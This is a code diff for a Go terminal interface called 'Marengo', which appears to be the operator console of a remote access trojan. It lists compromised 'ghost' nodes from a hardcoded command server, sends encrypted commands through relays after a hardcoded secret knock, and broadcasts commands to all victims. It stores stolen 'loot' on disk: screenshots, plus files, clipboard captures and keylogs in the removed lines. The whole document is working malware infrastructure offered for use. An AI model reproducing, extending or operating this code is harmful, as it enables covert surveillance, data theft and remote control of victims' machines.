@@ -19,16 +19,17 @@ import (
 var (
 	app           = tview.NewApplication()
 	targetList    = tview.NewList().ShowSecondaryText(false)
-	outputView    = tview.NewTextView().SetDynamicColors(true).SetWordWrap(true).SetChangedFunc(func() { app.Draw() })
-	commandInput  = tview.NewInputField().SetLabel("Command: ").SetFieldWidth(0)
+	outputView    = tview.NewTextView()
+	logView       = tview.NewTextView()
+	commandInput  = tview.NewInputField()
 	currentSecret string
+	uiStartTime   = time.Now() // Renamed from startTime
 )
 
 type AuthRequest struct {
 	Type     string `json:"type"`
 	Key      string `json:"key"`
-	TargetID string `json:"target_id"` // Must match the Brain's decoder!
-	Listen   string `json:"listen"`
+	TargetID string `json:"target_id"`
 }
 
 type RoutingInfo struct {
@@ -36,15 +37,14 @@ type RoutingInfo struct {
 }
 
 func main() {
-	// 1. THE LOGIN FORM
 	loginForm := tview.NewForm().
 		AddPasswordField("Tenant Secret", "", 20, '*', func(text string) { currentSecret = text }).
-		AddButton("Login", func() {
+		AddButton("Initialize Link", func() {
 			if strings.TrimSpace(currentSecret) != "" {
 				setupDashboard()
 			}
 		})
-	loginForm.SetBorder(true).SetTitle(" Marengo Login ").SetTitleAlign(tview.AlignCenter)
+	loginForm.SetBorder(true).SetTitle(" MARENGO // AUTH ").SetTitleAlign(tview.AlignCenter)
 
 	if err := app.SetRoot(loginForm, true).Run(); err != nil {
 		panic(err)
@@ -52,126 +52,113 @@ func main() {
 }
 
 func setupDashboard() {
-	// --- THE FREEDOM MOVE ---
-	// Disables TUI mouse capture so you can hover, drag, and right-click to copy.
 	app.EnableMouse(false)
 
-	// 1. THE HEADER
-	header := tview.NewTextView().
-		SetTextAlign(tview.AlignCenter).
-		SetDynamicColors(true).
-		SetText("[black:green] Marengo v2 [-] [white]| TAB: Switch Focus | PgUp/PgDn: Scroll Console | Arrows: Select Ghost [-]")
+	// --- 1. THE HEADER (High-Density Banner) ---
+	header := tview.NewTextView().SetDynamicColors(true).SetTextAlign(tview.AlignCenter)
 
-	// 2. THE TARGET LIST (Sidebar)
-	targetList.SetBorder(true).
-		SetTitle(" 🛰️ ORBITAL NODES ").
-		SetTitleAlign(tview.AlignLeft).
-		SetBorderColor(tcell.ColorDeepSkyBlue)
-	targetList.SetSelectedBackgroundColor(tcell.ColorDarkSlateGray)
-	targetList.AddItem("ALL (Broadcast)", "Global Blast", 'a', nil)
+	// --- 2. NODE MATRIX (Left) ---
+	targetList.SetBorder(true).SetTitle(" 🌐 NODES ").SetTitleColor(tcell.ColorSpringGreen)
+	targetList.SetBackgroundColor(tcell.ColorBlack)
+	targetList.SetSelectedBackgroundColor(tcell.ColorSpringGreen)
+	targetList.SetSelectedTextColor(tcell.ColorBlack)
 
-	// 3. THE OUTPUT CONSOLE (Main View)
-	outputView.SetBorder(true)
-	outputView.SetTitle(" 📟 SYSTEM LOG ")
-	outputView.SetBorderColor(tcell.ColorGreen)
-	outputView.SetBackgroundColor(tcell.ColorBlack)
-	outputView.SetDynamicColors(true) // This will work now!
-	outputView.SetWordWrap(true)
+	// --- 3. TERMINAL (Center) ---
+	outputView.SetDynamicColors(true).SetWordWrap(true).SetBackgroundColor(tcell.ColorBlack)
+	outputView.SetBorder(true).SetTitle(" 🖥️ TERMINAL ").SetTitleColor(tcell.ColorDeepSkyBlue)
 
-	// 4. THE INPUT FIELD (Action Bar)
-	commandInput.SetLabel(" [green]λ[-] ").
-		SetLabelColor(tcell.ColorGreen).
-		SetFieldBackgroundColor(tcell.ColorBlack).
-		SetFieldTextColor(tcell.ColorWhite).
-		SetBorder(true).
-		SetTitle(" COMMAND INPUT ").
-		SetBorderColor(tcell.ColorDarkSlateGray)
+	// --- 4. TELEMETRY (Right) ---
+	logView.SetDynamicColors(true).SetBorder(true).SetTitle(" 📡 LOGS ").SetTitleColor(tcell.ColorOrange)
+	logView.SetBackgroundColor(tcell.ColorBlack)
 
-	// --- 🔑 THE 3-WAY FOCUS LOGIC (The Secret Sauce) ---
-	// TAB moves: List -> Console -> Input -> List
-	targetList.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
+	// --- 5. COMMAND INPUT ---
+	commandInput.SetLabel(" [RECV_READY] ➔ ").
+		SetLabelColor(tcell.ColorSpringGreen).
+		SetFieldBackgroundColor(tcell.ColorBlack)
+	commandInput.SetBorder(true).SetTitle(" ⌨️ EXECUTE ").SetTitleColor(tcell.ColorSpringGreen)
+
+	// --- 6. CIRCULAR FOCUS MANAGER (The Tab Fix) ---
+	// Define the rotation order
+	focusOrder := []tview.Primitive{targetList, commandInput, outputView}
+
+	app.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
 		if event.Key() == tcell.KeyTab {
-			app.SetFocus(outputView)
-			return nil
-		}
-		return event
-	})
-
-	outputView.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
-		if event.Key() == tcell.KeyTab {
-			app.SetFocus(commandInput)
-			return nil
-		}
-		// Allows arrows to work for scrolling even if mouse is disabled
-		return event
-	})
-
-	commandInput.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
-		if event.Key() == tcell.KeyTab {
+			currentFocus := app.GetFocus()
+			for i, primitive := range focusOrder {
+				if primitive == currentFocus {
+					nextIndex := (i + 1) % len(focusOrder)
+					app.SetFocus(focusOrder[nextIndex])
+					return nil
+				}
+			}
+			// Default fallback
 			app.SetFocus(targetList)
 			return nil
 		}
 		return event
 	})
 
-	// 5. AUTO-SCROLL LOGIC
-	outputView.SetChangedFunc(func() {
-		outputView.ScrollToEnd()
-		app.Draw()
-	})
+	// --- 7. HUD UPDATER ---
+	go func() {
+		for {
+			uptime := time.Since(uiStartTime).Round(time.Second)
+			header.SetText(fmt.Sprintf(
+				" [black:blue] MARENGO COMMAND [:-] [blue][-] [white]UPTIME: %s[-] [blue][-] [yellow]ACTIVE_BEACONS: %d[-] ",
+				uptime, targetList.GetItemCount()-1,
+			))
+			time.Sleep(1 * time.Second)
+			app.Draw()
+		}
+	}()
 
-	// 6. BACKGROUND REFRESH
+	// --- 8. REFRESH ENGINE (Stable) ---
 	go func() {
 		for {
 			t := fetchTargets()
 			app.QueueUpdateDraw(func() {
-				currIdx := targetList.GetCurrentItem()
-				var selectedName string
-				if currIdx >= 0 && currIdx < targetList.GetItemCount() {
-					selectedName, _ = targetList.GetItemText(currIdx)
+				currentName := ""
+				if targetList.GetItemCount() > 0 {
+					idx := targetList.GetCurrentItem()
+					if idx >= 0 && idx < targetList.GetItemCount() {
+						currentName, _ = targetList.GetItemText(idx)
+					}
 				}
 
 				targetList.Clear()
-				targetList.AddItem("ALL (Broadcast)", "Global Blast", 'a', nil)
+				targetList.AddItem("[ALL_BROADCAST]", "Global Command", 'a', nil)
 
 				newIdx := 0
-				for i, name := range t {
-					targetList.AddItem(name, "Active Node", 0, nil)
-					if name == selectedName {
-						newIdx = i + 1
+				for _, name := range t {
+					if name == "" {
+						continue
+					}
+					displayName := "NODE::" + name
+					targetList.AddItem(displayName, "Signal Active", 0, nil)
+					if displayName == currentName {
+						newIdx = targetList.GetItemCount() - 1
 					}
 				}
-				if newIdx < targetList.GetItemCount() {
-					targetList.SetCurrentItem(newIdx)
-				} else {
-					targetList.SetCurrentItem(0)
-				}
+				targetList.SetCurrentItem(newIdx)
+				fmt.Fprintf(logView, "[orange]%s[-] [white]PING[-] ➔ Brain Ack\n", time.Now().Format("15:04:05"))
 			})
-			time.Sleep(3 * time.Second)
+			time.Sleep(5 * time.Second)
 		}
 	}()
 
-	// 7. LAYOUT ASSEMBLY
-	mainBody := tview.NewFlex().
-		AddItem(targetList, 30, 1, false).
-		AddItem(tview.NewFlex().SetDirection(tview.FlexRow).
-			AddItem(outputView, 0, 1, false).
-			AddItem(commandInput, 3, 1, true), 0, 2, true)
-
-	finalLayout := tview.NewFlex().SetDirection(tview.FlexRow).
-		AddItem(header, 1, 1, false).
-		AddItem(mainBody, 0, 1, true)
-
-	// 8. INPUT HANDLING
+	// --- 9. INPUT ENGINE ---
 	commandInput.SetDoneFunc(func(key tcell.Key) {
 		if key == tcell.KeyEnter {
+			if targetList.GetItemCount() == 0 {
+				return
+			}
 			cmd := strings.TrimSpace(commandInput.GetText())
 			if cmd == "" {
 				return
 			}
 
 			idx := targetList.GetCurrentItem()
-			targetName, _ := targetList.GetItemText(idx)
+			fullText, _ := targetList.GetItemText(idx)
+			targetID := strings.TrimPrefix(fullText, "NODE::")
 
 			if cmd == "clear" {
 				outputView.Clear()
@@ -179,26 +166,88 @@ func setupDashboard() {
 				return
 			}
 
-			fmt.Fprintf(outputView, "\n[yellow]▼ COMMAND:[-] [white]%s[-] [yellow]→[-] [cyan]%s[-]\n", cmd, targetName)
+			ts := time.Now().Format("15:04:05")
+			fmt.Fprintf(outputView, "[white]%s[-] [green][TASK][-] %s ➔ %s\n", ts, targetID, cmd)
 
-			go func(target, command string) {
-				if target == "ALL (Broadcast)" {
+			go func(tid, command string) {
+				var res string
+				if tid == "[ALL_BROADCAST]" {
 					broadcastCommand(command)
 				} else {
-					res := executeRotatingCommand(target, command)
-					fmt.Fprintf(outputView, "[green]┌── RESPONSE (%s)───[-]\n[white]%s[-]\n[green]└────────────────────[-]\n", target, res)
+					res = executeRotatingCommand(tid, command)
+					fmt.Fprintf(outputView, "[white]%s[-] [blue][RECV][-] %s ➔ \n%s\n", ts, tid, formatResponse(tid, res))
 				}
 				app.Draw()
-			}(targetName, cmd)
+			}(targetID, cmd)
 
 			commandInput.SetText("")
 		}
 	})
 
+	// --- 10. OBSIDIAN LAYOUT ---
+	// Vertical stack for the main center area
+	centerFlex := tview.NewFlex().SetDirection(tview.FlexRow).
+		AddItem(outputView, 0, 1, false).
+		AddItem(commandInput, 3, 0, true)
+
+	// Horizontal main body
+	mainBody := tview.NewFlex().
+		AddItem(targetList, 25, 0, false). // Nodes
+		AddItem(centerFlex, 0, 1, true).   // Terminal + Input
+		AddItem(logView, 30, 0, false)     // Logs
+
+	// Final assembly
+	finalLayout := tview.NewFlex().SetDirection(tview.FlexRow).
+		AddItem(header, 1, 0, false).
+		AddItem(mainBody, 0, 1, true)
+
 	app.SetRoot(finalLayout, true).SetFocus(commandInput)
 }
 
-// --- NETWORK LOGIC ---
+func formatResponse(id, res string) string {
+	// 1. IMPROVED SNAP DETECTION
+	// We search for "SNAP_DATA:" anywhere in the response
+	if strings.Contains(res, "SNAP_DATA:") {
+		_ = os.Mkdir("loot", 0755)
+
+		// Split by the tag to isolate the Base64
+		parts := strings.Split(res, "SNAP_DATA:")
+		if len(parts) < 2 {
+			return "[red]ERROR: Snap Data Tag Found but Content Missing[-]"
+		}
+
+		// Clean up the string (remove any trailing newlines/spaces)
+		rawBase64 := strings.TrimSpace(parts[1])
+
+		// DECODE
+		imgBytes, err := base64.StdEncoding.DecodeString(rawBase64)
+		if err != nil {
+			// If decoding fails, it might be partial data.
+			// Let's log the first 20 chars of the failure for debugging.
+			return fmt.Sprintf("[red]DECODE_FAIL: %v (Start: %s...)[-]", err, rawBase64[:10])
+		}
+
+		timestamp := time.Now().Format("2006-01-02_15-04-05")
+		fileName := fmt.Sprintf("loot/snap_%s_%s.jpg", id, timestamp)
+
+		err = os.WriteFile(fileName, imgBytes, 0644)
+		if err != nil {
+			return "[red]WRITE_FAIL: " + err.Error() + "[-]"
+		}
+
+		// SUCCESS: This message replaces the wall of text
+		return fmt.Sprintf("[green]📸 SNAPSHOT_STORED:[-] %s [yellow](%d KB)[-]", fileName, len(imgBytes)/1024)
+	}
+
+	// 2. Standard Whoami/Dir Formatting
+	if strings.Contains(res, "[+] IDENT:") {
+		res = strings.ReplaceAll(res, "[+]", "[blue][+][-]")
+	}
+
+	return res
+}
+
+// --- NETWORK LOGIC (REMAINING UNCHANGED) ---
 
 func fetchTargets() []string {
 	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 2*time.Second)
@@ -206,14 +255,21 @@ func fetchTargets() []string {
 		return nil
 	}
 	defer c.Close()
+
+	// Send the request
 	json.NewEncoder(c).Encode(AuthRequest{Type: "cc_list", Key: currentSecret})
+
 	var t []string
-	json.NewDecoder(c).Decode(&t)
+	err = json.NewDecoder(c).Decode(&t)
+	if err != nil {
+		return nil
+	}
+
 	return t
 }
 
 func executeRotatingCommand(id, cmd string) string {
-	// 1. ROUTE REQUEST
+	// 1. Get Relay Address from Brain
 	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 2*time.Second)
 	if err != nil {
 		return "[red]Brain Unreachable[-]"
@@ -226,130 +282,44 @@ func executeRotatingCommand(id, cmd string) string {
 		return "[red]Target Offline/Busy[-]"
 	}
 
-	// 2. CONNECT TO RELAY
-	time.Sleep(200 * time.Millisecond)
+	// 2. Connect to the Relay
 	conn, err := net.DialTimeout("tcp", r.RelayAddr, 5*time.Second)
 	if err != nil {
 		return "[red]Relay Connection Refused[-]"
 	}
 	defer conn.Close()
 
-	// --- 🔐 THE V3 SECRET KNOCK (PSK) ---
-	// This MUST be the first thing sent to Port 5001
+	// 3. Secret Knock
 	const PSK = "8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE"
-	_, err = conn.Write([]byte(PSK))
-	if err != nil {
-		return "[red]Handshake Failed: Write Error[-]"
-	}
-	// ------------------------------------
+	conn.Write([]byte(PSK))
 
-	// 3. KEY INJECTION (For AES-GCM/CBC encryption)
-	sessionKey := generateSessionKey()
+	// 4. Handle Encryption (Crucial Step)
+	// You MUST generate the same session key the ghost expects
+	sessionKey := generateSessionKey() // This function must be in your crypto.go
 	conn.Write(sessionKey)
 
-	// 4. SEND COMMAND
-	enc, _ := encryptPayload(cmd, sessionKey)
-	fmt.Fprintf(conn, "%s\n", enc)
+	// 5. Send Encrypted Command
+	encCmd, _ := encryptPayload(cmd, sessionKey)
+	fmt.Fprintf(conn, "%s\n", encCmd)
 
-	// 5. RECEIVE & INTERCEPT
-	conn.SetReadDeadline(time.Now().Add(30 * time.Second)) // Longer for audio/files
+	// 6. Read and Decrypt the Result
+	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
 	reply, err := bufio.NewReader(conn).ReadString('\n')
 	if err != nil {
-		return "[red]Relay Timed Out / Closed[-]"
+		return "[red]No response from ghost (Timeout)[-]"
 	}
 
-	p, err := decryptPayload(strings.TrimSpace(reply), sessionKey)
+	// Decrypt the response before returning it to the TUI
+	decryptedRes, err := decryptPayload(strings.TrimSpace(reply), sessionKey)
 	if err != nil {
-		return "[red]Decryption Failure (Stream Corrupted)[-]"
+		return "[red]Decryption Error: " + err.Error() + "[-]"
 	}
 
-	// --- SMART LOOT INTERCEPTOR ---
-	if strings.HasPrefix(p, "FILE_DATA:") {
-		// Remove prefix and split the filename from the data
-		payload := strings.TrimPrefix(p, "FILE_DATA:")
-		parts := strings.SplitN(payload, "|", 2)
-
-		if len(parts) < 2 {
-			return "[red]Loot Error: Malformed Packet[-]"
-		}
-
-		originalName := parts[0]
-		encodedData := parts[1]
-
-		rawData, err := base64.StdEncoding.DecodeString(encodedData)
-		if err != nil {
-			return "[red]Loot Corruption: Base64 Fail[-]"
-		}
-
-		os.MkdirAll("loot", 0755)
-
-		// Save using the original name, but prefixed with the TargetID to avoid overwrites
-		savePath := fmt.Sprintf("loot/%s_%s", id, originalName)
-
-		err = os.WriteFile(savePath, rawData, 0644)
-		if err != nil {
-			return fmt.Sprintf("[red]Disk Error: %v[-]", err)
-		}
-
-		return fmt.Sprintf("[black:green] 💰 LOOT SECURED [-] [green]Saved as %s (%d bytes)[-]", savePath, len(rawData))
-	}
-	// --- SNAP/LOOT INTERCEPTOR ---
-	if strings.HasPrefix(p, "SNAP_DATA:") || strings.HasPrefix(p, "FILE_DATA:") {
-		isSnap := strings.HasPrefix(p, "SNAP_DATA:")
-		encoded := ""
-		extension := ".bin"
-
-		if isSnap {
-			encoded = strings.TrimPrefix(p, "SNAP_DATA:")
-			extension = ".png"
-		} else {
-			encoded = strings.TrimPrefix(p, "FILE_DATA:")
-		}
-
-		rawData, _ := base64.StdEncoding.DecodeString(encoded)
-		os.MkdirAll("loot", 0755)
-		fileName := fmt.Sprintf("loot/%s_%d%s", id, time.Now().Unix(), extension)
-		os.WriteFile(fileName, rawData, 0644)
-
-		prefix := "💰 LOOT"
-		if isSnap {
-			prefix = "📸 SNAP"
-		}
-		return fmt.Sprintf("[black:green] %s SECURED [-] [green]Saved to %s[-]", prefix, fileName)
-	}
-	// If the response contains our sysinfo headers, colorize it!
-	if strings.Contains(p, "[+] IDENT:") {
-		p = strings.ReplaceAll(p, "[+]", "[cyan][+][-]")
-		p = strings.ReplaceAll(p, "ADMIN/SYSTEM", "[red]ADMIN/SYSTEM[-]")
-
-	}
-	if strings.Contains(p, "--- [CLIPBOARD SNATCH] ---") {
-		os.MkdirAll("loot/clips", 0755)
-		clipFile := fmt.Sprintf("loot/clips/%s_clips.txt", id)
-
-		f, _ := os.OpenFile(clipFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-		f.WriteString(fmt.Sprintf("[%s] %s\n", time.Now().Format("15:04:05"), p))
-		f.Close()
-
-		return "[cyan]📋 CLIPBOARD SNATCHED [-] [green]Log updated: " + clipFile + "[-]\n" + p
-	}
-	if strings.Contains(p, "--- [KEYLOG REPORT] ---") {
-		os.MkdirAll("loot/logs", 0755)
-		logFile := fmt.Sprintf("loot/logs/%s_keys.txt", id)
-
-		// Append to the file so you don't lose old data
-		f, _ := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-		f.WriteString(p + "\n")
-		f.Close()
-
-		return "[yellow]🔑 KEYLOG CAPTURED [-] [green]Saved to " + logFile + "[-]\n" + p
-	}
-	return p
+	return decryptedRes
 }
-
 func broadcastCommand(cmd string) {
 	targets := fetchTargets()
-	fmt.Fprintf(outputView, "[blue][!] Blasting to %d targets...[-]\n", len(targets))
+	fmt.Fprintf(outputView, "[blue][*][-] Blasting to %d targets...[-]\n", len(targets))
 	var wg sync.WaitGroup
 	for _, id := range targets {
 		wg.Add(1)
@@ -360,5 +330,4 @@ func broadcastCommand(cmd string) {
 		}(id)
 	}
 	wg.Wait()
-	fmt.Fprintf(outputView, "[green][+++] Broadcast Complete.[-]\n")
 }
